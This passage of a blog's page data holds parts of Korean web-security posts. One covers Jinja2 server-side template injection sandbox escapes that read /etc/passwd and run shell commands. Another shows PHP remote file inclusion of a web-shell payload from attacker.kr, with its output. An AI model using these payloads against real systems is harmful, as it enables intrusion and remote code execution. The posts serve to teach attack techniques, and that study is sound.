operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.dropwhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.takewhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.islice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.starmap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.imap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.chain'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.compress'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilterfalse'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.count'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip_longest'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.permutations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.product'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.repeat'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.groupby'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee_dataobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools._grouper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_thread._localdummy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread._local'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread.lock'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'method_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'markupsafe._MarkupEscapeHelper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io._IOBase'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io.IncrementalNewlineDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_hashlib.HASH'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_random.Random'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringO'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringI'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Unpickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Pickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'functools.partial'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLContext'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLSocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._closedsocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_socket.socket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._socketobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._fileobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'time.struct_time'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'Struct'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'urlparse.ResultMixin'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.GeneratorContextManager'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.closing'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Encoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.decoder.JSONDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.encoder.JSONEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'threading._Verbose'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.MissingType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.LRUCache'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.Cycler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> 'jinja2<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span>Joiner’<span class=\"token operator\">></span> …</code></pre></div>\n</li>\n<li>\n<p>출력된 결과에서 n번째 클래스를 선택하면 파일 클래스를 찾을 수 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># => &lt;type 'file'></span></code></pre></div>\n<ul>\n<li>sub class의 file class를 찾았다면은 <code class=\"language-text\">open('/etc/passwd/').read()</code> 호출하여 파일을 읽을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<p><strong>SSTI MRO File Read/Exec</strong></p>\n<ul>\n<li><code class=\"language-text\">subprocess.Popen</code> 객체를 활용하여 서버내 파일을 읽어와 출력하는 형태로 진행할 수 있습니다.</li>\n<li>subprocess 모듈을 사용하여 하부 프로세스 생성과 관리를 하는 <code class=\"language-text\">popen</code> 클래스를 사용합니다.</li>\n<li>새로운 프로세스에서 자식 프로그램을 실행하고 POSIX에서 클래스는 자식 프로그램을 실행하는데 <code class=\"language-text\">os.execvp()</code> 와 동일하게 동작하며 <code class=\"language-text\">Shell=True</code> 셸의 기본 값이 /bin/sh로 지정되어 명령을 수행할 수 있습니다.</li>\n<li>timeout시 프로세스가 종료되지 않도록 하기 위해 <code class=\"language-text\">communicate</code> 메서드를 활용합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'os'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-ssrf-example\">PHP SSRF Example</a></p>\n</li>\n<li>\n<p><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\">SSRF 공격시 사용 가능한 Protocol 종류</a></p>\n<ul>\n<li><a href=\"#php-wrapper-only-php\">PHP Wrapper (Only PHP)</a></li>\n<li><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\">Gopher Protocol을 활용한 HTTP 패킷 전송</a></li>\n<li><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\">Gopher 프로토콜 활용 데이터베이스 접근</a></li>\n<li><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\">그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</a></li>\n<li><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\">XXE 파일 읽기</a></li>\n<li><a href=\"#bind-xxe-attack\">Bind XXE Attack</a></li>\n<li><a href=\"#server-side-template-injection-example\">Server Side Template Injection Example</a></li>\n<li><a href=\"#ssti-sandbox-escape\">SSTI Sandbox Escape</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"SSRF Overview 웹 어플리케이션에서 요청이 보내질 떄 웹 어플리케이션이 작동하고 있는 서버 내부의 포트, 서버와 연결된 내부망에 요청을 보낼 수 가 있죠 server-side에서 변조된 요청, 의도하지 않은 서버로 요청을 보내어 별도의 인증 없이 내부방 안에서 요청되는 데이터를 조작하는 공격 기법입니다. 즉, 공격자가 의도한 서버로 요청을 가게 하는 취약점으로 CSRF 와 유사한 형태지만 클라이언트가 아닌 서버에 직접 영향을 줄 수 있다는 점에서 차이가 있습니다. 다른 공격 기법과 연계 다른 취약점과 연계에서 사용할 경우 RCE로 이어질 수 있기 때문에 파급력이 큽니다. XXE 취약점 + SSRF 취약점 SSRF 취약점 + CRLF Injection 취약점 SSRF 취약점 + Redis-Server 연계 취약점 SSRF + MongoDB 연계 취약점 PHP SSRF Example php curl API가 설정된 대상 애플리케이션 환경에서 GET 메서드의 url 쿼리를 통해…","frontmatter":{"date":"December 26, 2021","title":"Web Application SSRF/XXE/SSTI 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥶"},"fields":{"slug":"/we_application_SSRF/"}},"next":{"id":"07d4be14-a461-5f0c-835a-237119bbd5b1","html":"<h1 id=\"quickstart\" style=\"position:relative;\"><a href=\"#quickstart\" aria-label=\"quickstart permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>QuickStart</h1>\n<h2 id=\"web-application-rce-case\" style=\"position:relative;\"><a href=\"#web-application-rce-case\" aria-label=\"web application rce case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application RCE Case</h2>\n<h3 id=\"php\" style=\"position:relative;\"><a href=\"#php\" aria-label=\"php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP</h3>\n<ul>\n<li>File Inclusion, File upload, …</li>\n</ul>\n<h3 id=\"nodejs\" style=\"position:relative;\"><a href=\"#nodejs\" aria-label=\"nodejs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS</h3>\n<ul>\n<li>Code Injection, Unserialize, …</li>\n</ul>\n<h3 id=\"flask\" style=\"position:relative;\"><a href=\"#flask\" aria-label=\"flask permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flask</h3>\n<ul>\n<li>Server Side Template Injection, …</li>\n</ul>\n<h2 id=\"rce-case1-php\" style=\"position:relative;\"><a href=\"#rce-case1-php\" aria-label=\"rce case1 php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case1 #PHP</h2>\n<h3 id=\"file-inclusion\" style=\"position:relative;\"><a href=\"#file-inclusion\" aria-label=\"file inclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File Inclusion</h3>\n<ul>\n<li>php <code class=\"language-text\">include</code> 키워드는 <code class=\"language-text\">text/code/markup</code> 형식의 파일을 읽어와 php 파일의 내용을 다른 PHP 파일에 삽입할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>file<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>예시로 공격 대상 서버에 <code class=\"language-text\">include</code>가 가능한 경우 RCE가 가능한 페이로드를 업로드하여 호출함으로 써 공격이 가능해진다.</li>\n</ul>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># > https://victim.kr/index.php?file=https://attacker.kr/payload.txt&amp;cmd=id</span></code></pre></div>\n<p><strong>payload.txt</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">uid<span class=\"token operator\">=</span><span class=\"token number\">20080</span> gid<span class=\"token operator\">=</span><span class=\"token number\">1001</span> groups<span class=\"token operator\">=</span><span class=\"token number\">1001</span></code></pre></div>\n<ul>\n<li>공격자의 <code class=\"language-text\">payload</code> 데이터를 include 하였기 때문에 원하는 방향으로 수행할 수 있는 구조가 생긴다.</li>\n</ul>\n<h3 id=\"file-inclusion-technique\" style=\"position:relative;\"><a href=\"#file-inclusion-technique\" aria-label=\"file inclusion technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File Inclusion technique</h3>\n<h4 id=\"맛있는-code-classlanguage-textincludecode-할-대상-파일\" style=\"position:relative;\"><a href=\"#%EB%A7%9B%EC%9E%88%EB%8A%94-code-classlanguage-textincludecode-%ED%95%A0-%EB%8C%80%EC%83%81-%ED%8C%8C%EC%9D%BC\" aria-label=\"맛있는 code classlanguage textincludecode 할 대상 파일 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>맛있는 <code class=\"language-text\">include</code> 할 대상 파일</h4>\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> : 리눅스 계정 목록 [Local File]</li>\n<li><code class=\"language-text\">/proc/self/maps</code> : 프로그램 메모리 덩보 [Local File]</li>\n<li><code class=\"language-text\">/var/www/html/[payload.*]</code> : 코드를 실행할 수 있는 php 코드 [Local File]</li>\n<li><code class=\"language-text\">https://attacker.kr/payload.txt</code> : 코드를 실행할 수 있는 php 코드 [Remote File]</li>\n</ul>\n<h4 id=\"시도-해-볼-만한-함수\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%8F%84-%ED%95%B4-%EB%B3%BC-%EB%A7%8C%ED%95%9C-%ED%95%A8%EC%88%98\" aria-label=\"시도 해 볼 만한 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 